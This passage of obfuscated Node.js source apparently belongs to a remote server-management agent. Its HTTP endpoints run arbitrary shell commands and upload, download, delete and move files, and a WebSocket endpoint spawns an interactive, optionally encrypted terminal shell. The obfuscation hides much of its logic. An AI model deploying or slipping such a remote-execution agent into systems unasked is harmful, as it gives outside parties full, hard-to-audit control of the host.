        const bo = a0S;
        if (this['msgQueue'][bo(0x182)] > 0x0)
            return this[bo(0x223)][bo(0x19c)]();
        return new Promise(a => {
            const bp = bo;
            this[bp(0x231)][bp(0x28e)](a);
        });
    }
    async [a0S(0x1e6)](a) {
        const bq = a0S, b = {
                'AerFX': function (c, d) {
                    return c(d);
                },
                'jYYzI': bq(0x1f7),
                'GBwpK': function (c, d) {
                    return c > d;
                },
                'GjkES': '三次握手交互后仍未进入\x20Established\x20状态',
                'UqhVO': '✅\x20Noise\x20握手完成，端到端加密通道已建立！',
                'ZreCx': bq(0x2cd)
            };
        b[bq(0x2e2)](a, b[bq(0x41e)]);
        try {
            await this[bq(0x422)]['init']();
            const c = await this[bq(0x1f2)](), d = this['cipher'][bq(0x406)](c);
            d && b['GBwpK'](d[bq(0x182)], 0x0) && this[bq(0x359)][bq(0x1fb)](d);
            const f = await this['_receiveWsBytes']();
            this[bq(0x422)]['processHandshake'](f);
            if (!this[bq(0x422)]['handshakeFinished'])
                throw new Error(b[bq(0x1b4)]);
            b['AerFX'](a, b['UqhVO']);
        } catch (g) {
            b[bq(0x2e2)](a, bq(0x260) + g[bq(0x197)]);
            throw new Error(b[bq(0x2e5)]);
        }
    }
    [a0S(0x30c)]() {
        const br = a0S, a = {
                'ywGOQ': '/bin/bash',
                'frXuk': br(0x3ad),
                'tJFLp': br(0x251),
                'HxInF': '/bin/sh'
            }, b = process.env.SHELL;
        if (b && a0h['existsSync'](b))
            return b;
        const c = [
            a['ywGOQ'],
            a['frXuk'],
            a[br(0x402)],
            br(0x2f2)
        ];
        for (const d of c) {
            if (a0h[br(0x378)](d))
                return d;
        }
        return a[br(0x226)];
    }
    async [a0S(0x36f)](a, b, c) {
        const bs = a0S, d = {
                'RqLhu': function (g, h) {
                    return g(h);
                },
                'CyqeI': bs(0x261),
                'RstSz': bs(0x2c4),
                'dEXbz': 'message',
                'HZCGL': function (g, h) {
                    return g(h);
                }
            };
        this[bs(0x359)] = a, this[bs(0x3ff)] = b;
        const f = g => a0t[bs(0x419)](bs(0x165) + b + ']\x20' + g);
        this['useNoise'] = !c, d[bs(0x3d3)](f, this[bs(0x353)] ? d['CyqeI'] : d[bs(0x344)]), a['on'](d[bs(0x2d2)], g => this[bs(0x3fc)](g));
        try {
            this[bs(0x353)] && await this[bs(0x1e6)](f), await this['_runTerminal'](f);
        } catch (g) {
            d['HZCGL'](f, bs(0x3ae) + g[bs(0x197)]), await this[bs(0x13e)]();
        }
    }
    async [a0S(0x178)](a) {
        const bt = a0S, b = {
                'OwbfX': bt(0x1b7),
                'MojRH': function (f, g) {
                    return f === g;
                },
                'FsTez': function (f, g) {
                    return f(g);
                },
                'HqsUy': bt(0x1eb),
                'SkiYq': function (f, g) {
                    return f(g);
                },
                'YnKMR': 'xterm-256color',
                'DYDWg': 'C.UTF-8',
                'Mbvzm': 'unknown',
                'KzwOO': bt(0x386),
                'gwuMx': function (f, g) {
                    return f > g;
                },
                'tZbyn': bt(0x3f6),
                'QbbLj': function (f, g) {
                    return f(g);
                }
            }, c = this['getAvailableShell']();
        b[bt(0x2e1)](a, bt(0x1c9) + c);
        const d = Object['assign']({}, process.env);
        delete d[bt(0x3ce)], d[bt(0x274)] = b['YnKMR'];
        if (!d['LANG'])
            d[bt(0x316)] = b['DYDWg'];
        try {
            this[bt(0x2fe)] = a0s[bt(0x409)](c, [], {
                'name': b[bt(0x3f8)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process[bt(0x269)](),
                'env': d
            }), b['FsTez'](a, '🚀\x20终端进程已启动\x20(PID:\x20' + (this[bt(0x2fe)][bt(0x2a7)] || b[bt(0x1c4)]) + ')'), this[bt(0x258)] = b[bt(0x384)];
            while (b[bt(0x3d5)](this[bt(0x223)][bt(0x182)], 0x0)) {
                const f = this['msgQueue'][bt(0x19c)]();
                this[bt(0x1a3)](f);
            }
            this[bt(0x2fe)][bt(0x155)](g => {
                const bu = bt;
                try {
                    let h = Buffer['from'](g, b[bu(0x377)]);
                    this[bu(0x353)] && this[bu(0x422)] && this['cipher'][bu(0x235)] && (h = this[bu(0x422)]['encrypt'](h)), b[bu(0x133)](this[bu(0x359)][bu(0x147)], 0x1) && this[bu(0x359)][bu(0x1fb)](h);
                } catch (i) {
                }
            }), this[bt(0x2fe)][bt(0x2aa)](({
                exitCode: g,
                signal: h
            }) => {
                const bv = bt;
                b[bv(0x1fa)](a, bv(0x15a) + g + bv(0x339) + h + ')'), this[bv(0x13e)]();
            }), this[bt(0x359)]['on'](b[bt(0x268)], () => {
                const bw = bt;
                b[bw(0x1fa)](a, b[bw(0x2b7)]), this[bw(0x13e)]();
            });
        } catch (g) {
            b[bt(0x333)](a, '💥\x20启动终端失败:\x20' + g[bt(0x197)]), await this[bt(0x13e)]();
            throw g;
        }
    }
    [a0S(0x1a3)](a) {
        const bx = a0S, b = {
                'MVtVX': bx(0x1b7),
                'dpSPp': bx(0x3ba),
                'oyNld': function (c, d) {
                    return c === d;
                },
                'oGnax': bx(0x2c1),
                'dGEzK': 'input',
                'vwMhV': function (c, d) {
                    return c !== d;
                },
                'fhlHA': bx(0x308)
            };
        if (!this[bx(0x2fe)])
            return;
        try {
            const c = Buffer['from'](a);
            let d;
            this[bx(0x353)] ? d = this[bx(0x422)]['decrypt'](c) : d = c;
            let f = ![], g = d[bx(0x39e)](b[bx(0x28d)]);
            if (g[bx(0x2ff)]()[bx(0x177)]('{'))
                try {
                    const h = JSON[bx(0x267)](g);
                    f = !![];
                    if (h['type'] === b[bx(0x298)]) {
                        let i = Buffer['from'](JSON[bx(0x194)]({ 'type': b[bx(0x298)] }));
                        if (this[bx(0x353)])
                            i = this[bx(0x422)][bx(0x34f)](i);
                        this[bx(0x359)]['send'](i);
                        return;
                    }
                    if (b[bx(0x13a)](h[bx(0x41c)], b[bx(0x1ef)])) {
                        this['ptyProcess']['resize'](h[bx(0x1ce)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (b['oyNld'](h['type'], b[bx(0x26a)]) && b[bx(0x2a3)](h[bx(0x3eb)], undefined)) {
                        let j = h['encoding'] === b[bx(0x404)] ? Buffer[bx(0x33a)](h[bx(0x3eb)], 'base64')[bx(0x39e)](b[bx(0x28d)]) : h[bx(0x3eb)];
                        this['ptyProcess'][bx(0x1c1)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[bx(0x2fe)]['write'](d[bx(0x39e)](b['MVtVX']));
        } catch (l) {
            a0t[bx(0x419)](bx(0x165) + this[bx(0x3ff)] + bx(0x3ef) + l[bx(0x197)]);
            if (this['useNoise'])
                this[bx(0x13e)]();
        }
    }
}
async function a0P() {
    const by = a0S, a = {
            'PyAGf': by(0x294),
            'YKORK': by(0x3b4),
            'vfrzg': by(0x1a4),
            'mWiaD': by(0x266),
            'qBWVj': by(0x323),
            'ZzGgu': function (b, c) {
                return b === c;
            },
            'jUZMz': by(0x1d1),
            'VlMBK': function (b) {
                return b();
            },
            'cmSVa': by(0x3fb),
            'yhfft': by(0x2bb),
            'YzPPd': by(0x170),
            'nDCTg': by(0x3e0),
            'gyFYB': function (b, c) {
                return b === c;
            },
            'CSTxL': by(0x372),
            'RvJKu': 'cmd\x20required',
            'evCtk': by(0x308),
            'DsdWO': 'x-file-size',
            'vecbc': 'x-original-path',
            'CSllK': by(0x1bf),
            'OBWvv': by(0x349),
            'MFRAw': function (b, c, d) {
                return b(c, d);
            },
            'ckAIM': function (b, c, d) {
                return b(c, d);
            },
            'KtsDa': by(0x139),
            'TPabM': by(0x3aa),
            'xRTrl': by(0x200),
            'YMAIn': by(0x173),
            'nGvqf': by(0x366),
            'fqfrg': by(0x1f8),
            'fkIZL': by(0x1d0),
            'hWuoI': by(0x21b),
            'UQWVn': by(0x325),
            'LVLjv': function (b) {
                return b();
            },
            'gukUJ': function (b, c) {
                return b(c);
            },
            'hgHjU': by(0x31b),
            'agezo': by(0x1d9),
            'OrWWh': function (b, c) {
                return b(c);
            },
            'fFKZo': by(0x376),
            'KOvyd': by(0x24a),
            'tikjh': by(0x3d1),
            'TreBY': by(0x187),
            'oIZpC': '/api/file/list',
            'PuEuu': by(0x24b),
            'rKnKs': by(0x3df),
            'auSGh': by(0x1f3),
            'ArYMN': '/api/file/cp',
            'smuND': '/api/file/new',
            'HxXvZ': by(0x174),
            'APrUZ': by(0x320),
            'mqKkl': '/api/task/status',
            'NqiNy': '/api/task/log/onetime',
            'qaLMq': by(0x221),
            'vFYzG': by(0x2b2),
            'yqPRs': by(0x188),
            'fYLXz': by(0x3c6),
            'ABxym': 'Starting\x20HTTP\x20server...',
            'qqELW': by(0x35a),
            'eYhEg': by(0x179),
            'zMMKQ': 'Fatal\x20error\x20in\x20main():'
        };
    try {
        a0t[by(0x3e6)](a[by(0x1d7)]), a0t[by(0x3e6)](a[by(0x30e)]), a0D[by(0x397)](), a0t['debug'](a['fqfrg']), a0t[by(0x3e6)](a[by(0x37f)]);
        const b = new a0E(a0D[by(0x164)], a0D[by(0x41b)]);
        a0t[by(0x3e6)]('CryptoManager\x20initialized'), a0t[by(0x3e6)](by(0x26c));
        const c = new a0G();
        a0t[by(0x3e6)](a[by(0x3ca)]), a0t[by(0x3e6)](a[by(0x205)]);
        const d = a[by(0x2d3)](a0f);
        a['gukUJ'](a0q, d), a0t[by(0x3e6)](a['hgHjU']), d[by(0x326)]((g, h, i) => {
            const bz = by, j = a[bz(0x300)][bz(0x2c5)]('|');
            let k = 0x0;
            while (!![]) {
                switch (j[k++]) {
                case '0':
                    h[bz(0x248)](a[bz(0x36d)], a[bz(0x1ee)]);
                    continue;
                case '1':
                    h[bz(0x248)](bz(0x3ec), a[bz(0x20a)]);
                    continue;
                case '2':
                    h[bz(0x248)](a['qBWVj'], '*');
                    continue;
                case '3':
                    if (a['ZzGgu'](g['method'], a['jUZMz']))
                        return h[bz(0x21f)](0xc8)[bz(0x29d)]();
                    continue;
                case '4':
                    a[bz(0x33f)](i);
                    continue;
                case '5':
                    h[bz(0x248)](a[bz(0x1e1)], a[bz(0x336)]);
                    continue;
                }
                break;
            }
        }), d[by(0x326)](a0f[by(0x12d)]({
            'type': () => !![],
            'limit': a[by(0x211)]
        })), d[by(0x326)](a0f[by(0x24c)]({ 'extended': !![] })), d['use'](a[by(0x38a)](a0F, b)), a0t[by(0x3e6)](a[by(0x2a9)]), d[by(0x382)](a[by(0x255)], async (g, h) => {
            const bA = by;
            try {
                const i = await c['getBasicInfo']();
                h[bA(0x40b)](i);
            } catch (j) {
                h['status'](0x1f4)[bA(0x40b)]({
                    'status': a[bA(0x22b)],
                    'message': j[bA(0x197)]
                });
            }
        }), d['get'](a['tikjh'], async (g, h) => {
            const bB = by;
            try {
                const i = await c[bB(0x3d4)]();
                h[bB(0x40b)](i);
            } catch (j) {
                h[bB(0x21f)](0x1f4)[bB(0x40b)]({
                    'status': a[bB(0x22b)],
                    'message': j[bB(0x197)]
                });
            }
        }), d[by(0x3dc)](a[by(0x322)], async (g, h) => {
            const bC = by;
            try {
                let i = null;
                if (a[bC(0x277)](typeof g['body'], a[bC(0x401)]))
                    i = g['body'][bC(0x2ff)]();
                else
                    g[bC(0x13c)] && a[bC(0x29b)](typeof g[bC(0x13c)], a[bC(0x18e)]) && (i = g[bC(0x13c)]['cmd'] || '');
                if (!i)
                    return h[bC(0x21f)](0x190)[bC(0x40b)]({
                        'status': 'error',
                        'message': a['RvJKu']
                    });
                const j = await a0H['execute'](i, {
                    'cwd': g['body']['cwd'],
                    'env': g[bC(0x13c)]['env'],
                    'timeout': a0D[bC(0x355)]
                });
                h[bC(0x40b)](j);
            } catch (k) {
                h[bC(0x21f)](0x1f4)[bC(0x40b)]({
                    'status': a[bC(0x22b)],
                    'message': k[bC(0x197)]
                });
            }
        }), d[by(0x3dc)](a[by(0x264)], async (g, h) => {
            const bD = by;
            try {
                const i = await a0I['listFiles'](g[bD(0x13c)]['path'], g[bD(0x13c)]['recursive']);
                h['json']({
                    'status': 'ok',
                    'count': i[bD(0x182)],
                    'files': i
                });
            } catch (j) {
                h[bD(0x21f)](0x1f4)['json']({
                    'status': a['YzPPd'],
                    'message': j['message']
                });
            }
        }), d['post'](a[by(0x291)], async (g, h) => {
            const bE = by;
            try {
                const i = await a0I[bE(0x27b)](g[bE(0x13c)][bE(0x2fd)] || []);
                h[bE(0x40b)]({
                    'status': 'ok',
                    'files': i
                });
            } catch (j) {
                h[bE(0x21f)](0x1f4)['json']({
                    'status': a[bE(0x22b)],
                    'message': j['message']
                });
            }
        }), d[by(0x1e8)](by(0x24b), async (g, h) => {
            const bF = by;
            try {
                const i = g[bF(0x13c)]['permissions'] || {}, j = g[bF(0x13c)][bF(0x3bf)] === !![], k = await a0I[bF(0x306)](i, j);
                h[bF(0x40b)](k);
            } catch (l) {
                h[bF(0x21f)](0x1f4)[bF(0x40b)]({
                    'status': a[bF(0x22b)],
                    'message': l[bF(0x197)]
                });
            }
        }), d[by(0x3dc)](by(0x351), async (g, h) => {
            const bG = by;
            try {
                const i = await a0I[bG(0x273)](g[bG(0x13c)][bG(0x3c0)]);
                h['json'](i);
            } catch (j) {
                h['status'](0x1f4)[bG(0x40b)]({
                    'status': a[bG(0x22b)],
                    'message': j['message']
                });
            }
        }), d['post'](a['rKnKs'], async (g, h) => {
            const bH = by;
            try {
                const i = await a0I[bH(0x32a)](g[bH(0x13c)][bH(0x3c0)], g[bH(0x13c)][bH(0x253)], g[bH(0x13c)][bH(0x1cd)], g[bH(0x13c)][bH(0x2f8)], g[bH(0x13c)]['total_chunks']);
                h[bH(0x40b)](i);
            } catch (j) {
                h[bH(0x21f)](0x1f4)[bH(0x40b)]({
                    'status': bH(0x170),
                    'message': j[bH(0x197)]
                });
            }
        }), d[by(0x3dc)](a[by(0x163)], async (g, h) => {
            const bI = by;
            try {
                const i = await a0I['downloadFile'](g['body']['path']), j = Buffer[bI(0x33a)](i[bI(0x1cd)], a[bI(0x3a6)]);
                return h[bI(0x138)](a[bI(0x208)], i[bI(0x1ab)][bI(0x39e)]()), h[bI(0x138)](a[bI(0x16a)], i['path']), h[bI(0x138)](a['CSllK'], a[bI(0x2de)]), h[bI(0x1fb)](j);
            } catch (k) {
                h[bI(0x21f)](0x1f4)[bI(0x40b)]({
                    'status': a['YzPPd'],
                    'message': k[bI(0x197)]
                });
            }
        }), d['delete'](a[by(0x206)], async (g, h) => {
            const bJ = by;
            try {
                let i = g[bJ(0x13c)][bJ(0x2fd)];
                if (!i || !Array[bJ(0x1fe)](i)) {
                    i = [];
                    if (g[bJ(0x13c)][bJ(0x3c0)])
                        i[bJ(0x28e)](g[bJ(0x13c)][bJ(0x3c0)]);
                    if (g['body'][bJ(0x2ad)])
                        i[bJ(0x28e)](g[bJ(0x13c)][bJ(0x2ad)]);
                }
                const j = await a0I[bJ(0x420)](i);
                h[bJ(0x40b)]({
                    'status': 'ok',
                    'results': j
                });
            } catch (k) {
                h['status'](0x1f4)[bJ(0x40b)]({
                    'status': a[bJ(0x22b)],
                    'message': k[bJ(0x197)]
                });
            }
        }), d['put'](a[by(0x206)], async (g, h) => {
            const bK = by;
            try {
                const i = await a0I[bK(0x1c6)](g[bK(0x13c)]['move_map'] || g['body']);
                h[bK(0x40b)]({
                    'status': 'ok',
                    'total': i[bK(0x182)],
                    'success': i[bK(0x14d)](j => j[bK(0x21f)] === 'ok')['length'],
                    'results': i
                });
            } catch (j) {
                h[bK(0x21f)](0x1f4)['json']({
                    'status': a[bK(0x22b)],
                    'message': j[bK(0x197)]
                });
            }
        }), d['post'](a[by(0x293)], async (g, h) => {
            const bL = by;
            try {
                const i = await a0I[bL(0x27e)](g[bL(0x13c)]);
                h[bL(0x40b)]({
                    'status': 'ok',
                    'total': i[bL(0x182)],
                    'success': i[bL(0x14d)](j => j[bL(0x21f)] === 'ok')[bL(0x182)],
                    'results': i
                });
            } catch (j) {
                h[bL(0x21f)](0x1f4)['json']({
                    'status': a[bL(0x22b)],
                    'message': j[bL(0x197)]
                });
            }
        }), d[by(0x3dc)](a[by(0x2b6)], async (g, h) => {
            const bM = by;
            try {
                const i = await a0I[bM(0x3e8)](g[bM(0x13c)][bM(0x3c0)]);
                h[bM(0x40b)](i);
            } catch (j) {
                h['status'](0x1f4)[bM(0x40b)]({
                    'status': a[bM(0x22b)],
                    'message': j['message']
                });
            }
        }), d[by(0x382)](a[by(0x36e)], (g, h) => {
            const bN = by;
            h['json'](a0J[bN(0x134)]());
        }), d[by(0x3dc)](a[by(0x36e)], async (g, h) => {
            const bO = by;
            try {
                const i = await a0J[bO(0x23d)](g[bO(0x13c)]);
                h[bO(0x40b)](i);
            } catch (j) {
                h[bO(0x21f)](0x1f4)[bO(0x40b)]({
                    'status': a['YzPPd'],
                    'message': j[bO(0x197)]
                });
            }
        }), d[by(0x382)](a['APrUZ'], (g, h) => {
            const bP = by;
            h[bP(0x40b)](a0J[bP(0x3a7)]());
        }), d[by(0x3dc)](by(0x320), (g, h) => {
            const bQ = by;
            try {
                const i = a0J[bQ(0x310)](g[bQ(0x13c)]);
                h[bQ(0x40b)](i);
            } catch (j) {
                h[bQ(0x21f)](0x1f4)[bQ(0x40b)]({
                    'status': a[bQ(0x22b)],
                    'message': j[bQ(0x197)]
                });
            }
        }), d['get'](a[by(0x358)], (g, h) => {
            const bR = by;
            h[bR(0x40b)](a0J[bR(0x365)]());
        }), d[by(0x382)](a[by(0x246)], (g, h) => {
            const bS = by;
            let i = a[bS(0x1cc)](parseInt, g['query']['limit'], 0xa) || 0x32;
            i = Math[bS(0x12f)](Math[bS(0x1a7)](i, 0x1), 0x64), h[bS(0x40b)](a0J[bS(0x337)](i));
        }), d[by(0x382)]('/api/task/log/cron', (g, h) => {
            const bT = by;
            let i = a[bT(0x3b1)](parseInt, g[bT(0x2d4)]['limit'], 0xa) || 0x32;
            i = Math[bT(0x12f)](Math[bT(0x1a7)](i, 0x1), 0x64), h['json'](a0J[bT(0x2e9)](i));
        }), d[by(0x2f3)](a[by(0x246)], (g, h) => {
            const bU = by;
            h[bU(0x40b)](a0J['clearOnetimeLogs']());
        }), d[by(0x2f3)](by(0x20e), (g, h) => {
            const bV = by;
            h[bV(0x40b)](a0J[bV(0x1e7)]());
        }), d[by(0x382)](a['qaLMq'], (g, h) => {
            const bW = by;
            h['json'](a0J[bW(0x192)]());
        }), d[by(0x3dc)](a[by(0x193)], async (g, h) => {
            const bX = by;
            try {
                const i = await a0J[bX(0x1f9)]();
                h[bX(0x40b)](i);
            } catch (j) {
                h[bX(0x21f)](0x1f4)[bX(0x40b)]({
                    'status': a[bX(0x22b)],
                    'message': j[bX(0x197)]
                });
            }
        }), a0t['debug'](a['yqPRs']), d['ws'](a['fYLXz'], async (g, h) => {
            const bY = by, i = h[bY(0x394)][0x0];
            a0t[bY(0x3e6)](bY(0x18b) + h[bY(0x357)]), a0t[bY(0x3e6)]('Matched\x20Sub-path:\x20' + i);
            const j = h[bY(0x2d4)][bY(0x3e4)], k = h[bY(0x2d4)][bY(0x23c)];
            a0t['debug'](bY(0x150) + j);
            if (!j) {
                a0t[bY(0x3e6)](a[bY(0x3ab)]), g[bY(0x3f6)](0x3f0, bY(0x29f));
                return;
            }
            const l = new a0O();
            await l[bY(0x36f)](g, j, k);
        }), a0t[by(0x3e6)](by(0x185)), a0t[by(0x3e6)](a[by(0x381)]);
        const f = d['listen'](a0D['PORT'], a0D['HOST'], () => {
            const bZ = by;
            a0t[bZ(0x3e6)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0D['AGENT_VERSION'] + bZ(0x2e0) + a0D['HOST'] + ':' + a0D[bZ(0x21a)]), a0t[bZ(0x3e6)](a[bZ(0x32e)]);
        });
        process['on'](a[by(0x375)], () => {
            const c0 = by;
            a0t[c0(0x3e6)](a[c0(0x2b5)]), f['close'](), process[c0(0x292)](0x0);
        }), a0t[by(0x3e6)](a[by(0x3e9)]);
    } catch (g) {
        a0t[by(0x170)](a[by(0x1ba)], g), process['exit'](0x1);
    }
}
(require['main'] === module || require[a0S(0x2f4)]?.[a0S(0x253)]?.['includes'](a0S(0x219))) && a0P()[a0S(0x162)](a0t[a0S(0x170)]);
module['exports'] = {
    'Config': a0D,
    'CryptoManager': a0E,
    'SystemInfoCollector': a0G,
    'CommandExecutor': a0H,
    'FileManager': a0I,
    'TaskManager': a0J
};